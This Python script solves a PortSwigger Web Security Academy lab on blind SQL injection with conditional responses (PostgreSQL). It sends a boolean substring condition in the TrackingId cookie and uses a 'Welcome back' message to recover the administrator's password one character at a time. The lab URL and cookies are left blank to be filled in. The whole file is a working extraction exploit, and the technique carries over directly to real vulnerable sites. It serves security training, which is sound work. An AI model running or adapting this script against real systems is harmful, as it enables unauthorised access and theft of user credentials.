"""Blind SQL injection with conditional responses.

Lab:  https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
DBMS: PostgreSQL
"""

import string
from urllib.parse import quote

import requests

alphabet = list(string.ascii_lowercase + string.digits)

# --- Fill these from your own live PortSwigger lab instance (Burp / DevTools) ---
# Lab instances are ephemeral, so these values expire. Replace before running:
#   url          -> your lab's base URL, e.g. "https://<id>.web-security-academy.net/"
#   tracking_id  -> current value of the TrackingId cookie (before the injection)
#   session      -> current value of the session cookie (see cookies dict below)
url = ""  # e.g. "https://<id>.web-security-academy.net/"
tracking_id = ""  # value of the TrackingId cookie, e.g. "XXXXXXXXXXXXXXXX"
session_cookie = (
    ""  # value of the "session" cookie, e.g. "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
)
headers = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not.A/Brand";v="24", "Chromium";v="158"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/158.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=0, i",
}

session = requests.session()
password = ""

for i in range(1, 21):
    is_found = False

    for char in alphabet:
        raw = f"{tracking_id}' and substring((select Password from Users where Username = 'administrator' ) , {i}, 1) = '{char}' -- "
        cookies = {
            "TrackingId": quote(raw, safe=""),
            "session": session_cookie,
        }

        response = session.get(url, headers=headers, cookies=cookies, timeout=10)

        if "Welcome back" in response.text:
            password += char
            is_found = True
            print(f"The character at position {i} is: {char}")
            break

    if not is_found:
        print(f"No character found at position {i}. Stopping search.")
        break

print(f"The password is: {password}")
